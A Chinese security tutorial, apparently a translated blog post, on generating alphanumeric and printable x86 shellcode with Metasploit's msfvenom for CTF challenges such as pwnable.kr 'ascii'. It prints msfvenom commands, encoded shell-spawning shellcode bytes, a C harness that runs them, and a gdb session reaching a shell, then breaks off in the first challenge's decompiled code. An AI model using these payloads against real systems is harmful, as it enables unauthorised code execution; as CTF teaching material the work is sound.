# 【技术分享】生成自己的Alphanumeric/Printable shellcode
##### 译文声明
本文是翻译文章，文章来源：安全客
译文仅供参考，具体内容表达以及含义原文为准。
****
作者：[WeaponX](http://bobao.360.cn/member/contribute?uid=2803578480)
预估稿费：400RMB
投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿
**  
**
**背景**
最近在看一些题目(pwnable.kr-ascii, pwnable.kr-ascii_easy, pwnable.tw-Death_Note)和漏洞(CVE-2017-7269-IIS6.0远程代码执行漏洞)的时候用到Alphanumeric/Printable
shellcode。本文不阐述如何书写Alphanumeric/Printable
shellcode，而是教大家如何使用Metasploit生成自己的shellcode和在特定条件下寄存器的设置。
所谓Alphanumeric是字符在[A-Za-z0-9]区间的，而Printable是字符的ascii码在0x1f和0x7f区间(不包含)的。
shellcode测试可以用以下代码测试。
    /*
     * $ gcc -m32 -fno-stack-protector -z execstack shellcode.c -o shellcode
     * $ ./shellcode
     */
    #include 
    #include 
    char shellcode[] = {
      "x89xe0xdbxd6xd9x70xf4x5ax4ax4ax4ax4ax4ax4ax4a"
      "x4ax4ax4ax4ax43x43x43x43x43x43x37x52x59x6ax41"
      "x58x50x30x41x30x41x6bx41x41x51x32x41x42x32x42"
      "x42x30x42x42x41x42x58x50x38x41x42x75x4ax49x50"
      "x6ax66x6bx53x68x4fx69x62x72x73x56x42x48x46x4d"
      "x53x53x4bx39x49x77x51x78x34x6fx44x33x52x48x45"
      "x50x72x48x74x6fx50x62x33x59x72x4ex6cx49x38x63"
      "x70x52x38x68x55x53x67x70x35x50x65x50x74x33x45"
      "x38x35x50x50x57x72x73x6fx79x58x61x5ax6dx6fx70"
      "x41x41"
    };
    int main()
    {
        printf("Shellcode Length:  %dn",(int)strlen(shellcode));
        printf("Shellcode is [%s]n", shellcode);
        int (*ret)() = (int(*)())shellcode;
        ret();
        return 0;
    }
**使用metasploit生成Alphanumeric shellcode**
首先查看一下metasploit中有什么编码器，其次查看能实现Alphanumeric的编码器。
    root@kali ~ msfvenom -l
    Framework Encoders
    ==================
        Name                          Rank       Description
        ----                          ----       -----------        ...
        x64/xor                       normal     XOR Encoder
        x86/add_sub                   manual     Add/Sub Encoder
        x86/alpha_mixed               low        Alpha2 Alphanumeric Mixedcase Encoder
        x86/alpha_upper               low        Alpha2 Alphanumeric Uppercase Encoder
        x86/unicode_mixed             manual     Alpha2 Alphanumeric Unicode Mixedcase Encoder
        x86/unicode_upper             manual     Alpha2 Alphanumeric Unicode Uppercase Encoder
        ...
可以使用的Encoders有x86/alpha_mixed与x86/alpha_upper和x86/unicode_mixed与x86/unicode_upper，不过Unicode
encoder是针对类似CVE-2017-7269等宽字节进行编码的。因此在本文中我们使用到的编码器为x86/alpha_mixed。
首先，使用msfvenom来生成一段shellcode并进行编码。
    root@kali ~ msfvenom -a x86 --platform linux -p linux/x86/exec CMD="sh" -e x86/alpha_mixed -f c     
    Found 1 compatible encoders
    Attempting to encode payload with 1 iterations of x86/alpha_mixed
    x86/alpha_mixed succeeded with size 137 (iteration=0)
    x86/alpha_mixed chosen with final size 137
    Payload size: 137 bytes
    unsigned char buf[] =
    "x89xe0xdbxd6xd9x70xf4x5ax4ax4ax4ax4ax4ax4ax4a"
    "x4ax4ax4ax4ax43x43x43x43x43x43x37x52x59x6ax41"
    "x58x50x30x41x30x41x6bx41x41x51x32x41x42x32x42"
    "x42x30x42x42x41x42x58x50x38x41x42x75x4ax49x50"
    "x6ax66x6bx53x68x4fx69x62x72x73x56x42x48x46x4d"
    "x53x53x4bx39x49x77x51x78x34x6fx44x33x52x48x45"
    "x50x72x48x74x6fx50x62x33x59x72x4ex6cx49x38x63"
    "x70x52x38x68x55x53x67x70x35x50x65x50x74x33x45"
    "x38x35x50x50x57x72x73x6fx79x58x61x5ax6dx6fx70"
    "x41x41";
可以发现，前几个字符x89xe0xdbxd6xd9x70xf4并不是Alphanumeric或者Printable，因为此shellcode的前面数条指令是为了让这段shellcode位置无关，完成了获取shellcode地址并放入通用寄存器中的功能。
然而，我们可以根据不同程序栈中的数据来自己完成将shellcode的地址放入指定的寄存器BufferRegister中的Alphanumeric
Instructions。例如，当BufferRegister为ECX寄存器时，可以通过如下命令生成Alphanumeric shellcode。
    ⚡ root@kali ⮀ ~ ⮀ msfvenom -a x86 --platform linux -p linux/x86/exec CMD="sh" -e x86/alpha_mixed BufferRegister=ECX -f python
    Found 1 compatible encoders
    Attempting to encode payload with 1 iterations of x86/alpha_mixed
    x86/alpha_mixed succeeded with size 129 (iteration=0)
    x86/alpha_mixed chosen with final size 129
    Payload size: 129 bytes
    buf =  ""
    buf += "x49x49x49x49x49x49x49x49x49x49x49x49x49"
    buf += "x49x49x49x49x37x51x5ax6ax41x58x50x30x41"
    buf += "x30x41x6bx41x41x51x32x41x42x32x42x42x30"
    buf += "x42x42x41x42x58x50x38x41x42x75x4ax49x71"
    buf += "x7ax56x6bx32x78x6ax39x71x42x72x46x42x48"
    buf += "x64x6dx63x53x6fx79x4ax47x73x58x34x6fx64"
    buf += "x33x30x68x33x30x33x58x44x6fx42x42x72x49"
    buf += "x30x6ex6fx79x48x63x76x32x38x68x67x73x37"
    buf += "x70x67x70x57x70x43x43x63x58x33x30x62x77"
    buf += "x76x33x6ex69x4dx31x38x4dx4bx30x41x41"
    ⚡ root@kali ⮀ ~ ⮀ python
    Python 2.7.9 (default, Mar  1 2015, 12:57:24)
    [GCC 4.9.2] on linux2
    Type "help", "copyright", "credits" or "license" for more information.
    >>> buf =  ""
    >>> buf += "x49x49x49x49x49x49x49x49x49x49x49x49x49"
    >>> buf += "x49x49x49x49x37x51x5ax6ax41x58x50x30x41"
    >>> buf += "x30x41x6bx41x41x51x32x41x42x32x42x42x30"
    >>> buf += "x42x42x41x42x58x50x38x41x42x75x4ax49x71"
    >>> buf += "x7ax56x6bx32x78x6ax39x71x42x72x46x42x48"
    >>> buf += "x64x6dx63x53x6fx79x4ax47x73x58x34x6fx64"
    >>> buf += "x33x30x68x33x30x33x58x44x6fx42x42x72x49"
    >>> buf += "x30x6ex6fx79x48x63x76x32x38x68x67x73x37"
    >>> buf += "x70x67x70x57x70x43x43x63x58x33x30x62x77"
    >>> buf += "x76x33x6ex69x4dx31x38x4dx4bx30x41x41"
    >>> buf
    'IIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIqzVk2xj9qBrFBHdmcSoyJGsX4od30h303XDoBBrI0noyHcv28hgs7pgpWpCCcX30bwv3niM18MK0AA'
测试生成的shellcode时会发生段错误。因为执行shellcode时ECX中的值并不是shellcode的地址。
    gdb-peda$ p $eip
    $3 = (void (*)()) 0x804a040 
    gdb-peda$ p $ecx
    $4 = 0x0
此时需手动将ecx的值设置为0x804a040，然后继续执行。
    gdb-peda$ p $ecx
    $4 = 0x0
    gdb-peda$ set $ecx=0x804a040
    gdb-peda$ c
    Continuing.
    process 14672 is executing new program: /bin/dash
    [New process 14689]
    process 14689 is executing new program: /bin/dash
    $ ls
    [New process 14690]
    process 14690 is executing new program: /bin/ls
    peda-session-ls.txt  peda-session-shellcode.txt  shellcode  shellcode.c
**示例**
题目下载地址：
[https://github.com/Qwaz/solved-hacking-problem/tree/master/pwnable.kr/ascii](https://github.com/Qwaz/solved-hacking-problem/tree/master/pwnable.kr/ascii)
使用ida载入ELF文件查看伪代码。发现程序先分配了一块内存，然后向内存中写长度为499的数据(Printable)，在函数vuln中使用strcpy时未检测源字符串长度发生栈溢出。
    int __cdecl main(int argc, const char **argv, const char **envp)
    {
      _BYTE *ptr; // ebx@6
      char v5; // [sp+4h] [bp-30h]@1
      int base; // [sp+28h] [bp-Ch]@1
      unsigned int offset; // [sp+2Ch] [bp-8h]@4
      base = mmap(0x80000000, 4096, 7, 50, -1, 0);
      if ( base != 0x80000000 )
      {
        puts("mmap failed. tell admin");
        exit(1);
      }
      printf("Input text : ", v5);
      offset = 0;
      do
      {
        if ( offset > 399 )